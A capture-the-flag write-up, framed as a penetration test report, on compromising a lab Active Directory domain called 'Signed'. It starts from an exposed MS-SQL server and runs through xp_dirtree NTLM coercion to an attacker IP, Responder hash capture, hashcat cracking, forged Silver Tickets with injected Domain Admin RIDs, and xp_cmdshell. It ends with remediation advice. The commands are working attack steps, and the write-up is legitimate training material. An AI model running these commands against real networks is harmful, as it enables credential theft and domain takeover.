# "Signed" Scenario – Kerberos Abuse & Active Directory Compromise

> **Context:** Simulated assessment on an Active Directory infrastructure compromised starting from an exposed MS-SQL database. The attack demonstrates how a single application vulnerability can cascade into total domain compromise via NTLM credential interception and Kerberos Silver Ticket forging.

**Assessment Date:** October 2025  
**Environment:** Windows Server + Active Directory + MS-SQL  
**Type:** Infrastructure Penetration Testing  
**Risk:** CRITICAL 🔴  
**Methodology:** PTES + Kerberos exploitation

---

## 1. Executive Summary

Starting from an MS-SQL instance exposed on the network with weak credentials, it was possible to completely compromise the AD infrastructure by leveraging a vulnerability chain:

1. **Database Exposure** – MS-SQL accessible with guest credentials
2. **NTLM Coercion** – Forced SMB authentication via `xp_dirtree` → hash capture using Responder
3. **Credential Recovery** – NTLMv2 hash cracked offline, access as `mssqlsvc`
4. **Kerberos Abuse** – Forging of Silver Ticket via PAC manipulation
5. **Domain Takeover** – Root access to the file system and leaking of sensitive flags

The impact: **Fully compromised domain**, administrative access, file system access.

---

## 2. Reconnaissance & Initial Access

Starting off with a classic nmap:

```bash
sudo nmap -A --open -v -T4 -Pn 10.129.197.161 -oA Signed
```

I notice right away that the only open port is the `ms-sql` one (port 1433). Initial credential testing:

```bash
impacket-mssqlclient -u scott -p tiger 10.129.197.161
```

Perfect, successful connection. Privilege: `guest` user, very limited. I can't run advanced queries, but I have access to something interesting: the `xp_dirtree` stored procedure.

---

## 3. NTLM Credential Extraction via xp_dirtree

Since I'm `guest`, I can't do squad at the direct escalation level. But I discovered a technique: if I use `xp_dirtree` pointing to a non-existent UNC path towards my IP, the database **attempts to authenticate to it via SMB**. And there, with Responder listening, you capture the service account's hash.

Setup:

```bash
sudo responder -I tun0
```

From the database:

```sql
EXEC xp_dirtree '\\10.10.15.35\nonexistent';
```

Responder captures:

```
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:1122334455667788:...
```

Hash captured. Perfect.

---

## 4. Hash Cracking & Service Account Compromise

After saving the hash, I crack it with hashcat, mode 5600 (NTLMv2):

```bash
hashcat -m 5600 mssqlsvc_hash.txt /usr/share/wordlists/rockyou.txt --force
```

And thanks to good luck, the password is crackable. Access as `mssqlsvc`:

```bash
impacket-mssqlclient -u mssqlsvc -p 'EvilPassword123' 10.129.197.161
```

Output:

```
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Now I have `dbo` privileges on the database. But there's an issue: even if I turn on `xp_cmdshell`, I can't access sensitive files. Why? Because the **MS-SQL process** executing the commands doesn't have the OS permissions to read them.

---

## 5. Domain SID Enumeration

To craft an effective Silver Ticket, I need to extract the Domain SID. Query from the database:

```sql
SELECT name, sid, type, type_desc FROM sys.server_principals;
GO
```

Output (sample):

```
SIGNED\Administrator   | 0x01050000000000051500000...
SIGNED\Domain Admins   | 0x01050000000000051500000...
SIGNED\IT              | 0x01050000000000051500000519000C
```

Converting the binary SIDs to string format (small Python script):

```
Domain SID: S-1-5-21-4088429403-1159899800-2753317549
```

Taking note.

---

## 6. First Silver Ticket – Database Admin Access

Now I craft the first Silver Ticket. Goal: impersonate Administrator towards MS-SQL, enable `xp_cmdshell`, and read the user flag.

```bash
impacket-ticketer \
  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/dc01.signed.htb \
  -groups 1105 \
  -user-id 500 \
  Administrator
```

Output:

```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/Administrator
[*] Saving ticket in Administrator.ccache
```

I assign it as an environment variable and connect:

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
```

Result:

```
SQL (SIGNED\Administrator  dbo@master)>
enable_xp_cmdshell
[*] Configuration option 'xp_cmdshell' changed from 0 to 1

xp_cmdshell 'type C:\Users\scott\Desktop\user.txt'
HTB{flaghere}
```

User flag obtained. But when I try to read `C:\Users\Administrator\Desktop\root.txt`, access denied. Because the MS-SQL process **is not a member of the Domain Admins group at the OS level**.

---

## 7. PAC Manipulation & Second Silver Ticket

After cursing for a good half hour, I realize: I must craft a second ticket that is NOT Administrator, but rather `mssqlsvc` **with membership to Domain Admins groups in the PAC**.

The PAC (Privilege Attribute Certificate) is the data structure inside the Kerberos ticket containing group RIDs. If I manually forge it by inserting RIDs 512 (Domain Admins) and 519 (Enterprise Admins), the MS-SQL service trusts it without re-validating with the KDC.

```bash
impacket-ticketer \
  -nthash EF699384C3285C54128A3EE1DDB1A0CC \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 \
  -groups 512,519,1105 \
  -user-id 1103 \
  mssqlsvc
```

Parameters change: `-groups` now contains Domain Admins RID (512) and `-user-id` is 1103 (custom RID). Assigning the ticket:

```bash
export KRB5CCNAME=mssqlsvc_admin.ccache
impacket-mssqlclient -k -no-pass dc01.signed.htb
```

Now I try to read the root flag:

```sql
SQL (SIGNED\mssqlsvc  dbo@master)>
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
```

Success! Root flag obtained.

The reason why it works: **the forged PAC tells the system that `mssqlsvc` is a member of Domain Admins. The file system check sees the RID 512 in the token and grants access.**

---

## 8. Why This Works – Technical Breakdown

Kerberos assumes that signed tokens are **trustworthy**. When we have the NT hash of the service account (`mssqlsvc`), we can **forge the token entirely**, circumventing the PAC with arbitrary RIDs.

**Differences between the two tickets:**

| Aspect | First Ticket | Second Ticket |
|--------|-------------|---|
| **User** | Administrator (ID 500) | mssqlsvc (ID 1103) |
| **Groups** | [1105] (User) | [512, 519, 1105] (DA, EA, User) |
| **DB Accessibility** | ✓ `dbo` + `xp_cmdshell` | ✓ `dbo` + `xp_cmdshell` |
| **OS File Accessibility** | ✗ Process is not DA | ✓ Process inherits DA from PAC |

In the first ticket, even if **the name says Administrator**, the **MS-SQL process runs as `mssqlsvc`** which is not a DA member.

In the second ticket, the PAC contains the RID 512 (**Domain Admins**), so even if the name is `mssqlsvc`, the token has the necessary permissions.

---

## 9. Attack Chain Visualization

```
┌─ Initial Access: MS-SQL exposed (port 1433)
├─ Stored Procedure Access: xp_dirtree → SMB auth coercion
├─ NTLM Hash Capture: Responder intercept
├─ Hash Cracking: Hashcat offline
├─ Service Account Escalation: mssqlsvc DB access
├─ SID Enumeration: Domain SID extraction
├─ Silver Ticket (1): DB Admin → User Flag
├─ PAC Manipulation: RID forging (Domain Admins membership)
├─ Silver Ticket (2): OS-level DA → Root Flag
└─ Domain Compromised
```

---

## 10. Remediation & Prevention

Mitigating this type of attack requires a **multi-layer approach**:

**Immediate fixes:**
- Disable `xp_dirtree` and `xp_cmdshell` on MS-SQL instances that do not strictly need them
- Enforce strong/complex passwords on service accounts
- Disable LLMNR/NBT-NS via GPO (disarms Responder)

**Medium-term:**
- Migrate service accounts to **Group Managed Service Accounts (gMSA)** → passwords auto-rotated every 30 days (infeasible to crack in the required time)
- Network segmentation: isolated database VLAN, only app servers can connect

**Long-term:**
- Migrate to Kerberos-only (disable NTLM entirely)
- Implement Zero-Trust model: conditional access based on device posture
- Deploy SIEM with detection on `xp_dirtree` execution and Kerberos anomalies

---

## 11. Key Insights

This scenario perfectly demonstrates the **classic progression**: a single misconfiguration (exposed DB + allowed xp_dirtree) propagates to full compromise because:

1. **Service account bridging** – A service account connects the app layer with the OS layer
2. **Token trust model** – Kerberos trusts signed tokens with no re-validation
3. **PAC forgery** – If you control the account signing the tokens, you control the permissions

It's not **one** vulnerability, but an **architectural chain** where each layer assumes the previous one is secure, but it isn't.

---

**Assessment Completed: October 2025**